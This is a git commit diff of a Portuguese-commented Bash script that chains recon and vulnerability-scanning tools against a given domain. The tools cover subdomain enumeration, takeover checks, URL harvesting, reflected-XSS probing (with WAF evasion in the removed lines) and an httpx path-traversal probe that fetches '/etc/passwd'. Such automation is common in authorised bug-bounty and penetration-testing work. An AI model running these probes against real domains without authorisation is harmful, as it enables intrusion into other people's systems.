7bf7afebdf11242b977a1e968e731f1b7e2c7667
1bat4’n <63245089+6bat66@users.noreply.github.com>
2022-10-31 13:25:22 -0300

    Create lowfruit.sh

--- lowfruit.sh
+++ lowfruit.sh
@@ -1,30 +1,41 @@
 #!/bin/bash
+    echo ""
+    echo "MODO DE USO"
+    echo "./lowfruit.sh <dominio> <arquivo de sudominios>"
+    echo "Obs: Caso não tenha o arquivo de subdominios o script fara a enumeração sozinho"
+    echo ""
 
-#------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
-amass enum --passive -d $1 -o domains_$1
-assetfinder --subs-only $1 | tee -a domains_$1
 
-subfinder -d $1 -o domains_subfinder_$1
-cat domains_subfinder_$1 | tee -a domains_$1
+if [ "$2" == "" ]
+then
+    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
+    amass enum --passive -d $1 -o domains_$1
+    assetfinder --subs-only $1 | tee -a domains_$1
 
-sort -u domains_$1 -o domains_$1
-cat domains_$1 | filter-resolved | tee -a domains_$1.txt
-#------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
+    subfinder -d $1 -o domains_subfinder_$1
+    cat domains_subfinder_$1 | tee -a domains_$1
 
-subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
+    sort -u domains_$1 -o domains_$1
+    cat domains_$1 | filter-resolved | tee -a domains_$1.txt
+    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#
 
-cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; 
+    subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
+    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; #Procurar URLs com base na internet 
+    grep "=" allUrls.txt | tee allParams.txt # Encontrar todos os parametros
+    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest; # Encontrar parametros refletidos
+    httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
+else 
+    subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
+    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; #Procurar URLs com base na internet 
+    grep "=" allUrls.txt | tee allParams.txt # Encontrar todos os parametros
+    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest; # Encontrar parametros refletidos
+    httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
 
+fi 
 #cat allUrls.txt | grep -i "\.log$" | tee log.txt;
 #cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
 #cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
 #cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
 #cat domains_$1 | grep -i "\.<>$" allUrls.txt | tee log.txt;
-
-grep "=" allUrls.txt | tee allParams.txt; # Encontrar parametros que recebem algo
-cat allParams.txt | dalfox file allParams.txt --waf-evasion | tee xsstest; # Encontrar parametros que refletem caracteres e possiveis xss
-httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
-
-
 #httpx -l allUrls.txt -mc 403 | tee 403s.txt; # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
 #/home/kali/tools/403-bypass/403-bypass.py -U 403s.txt; # tentativa de bypass com outro script
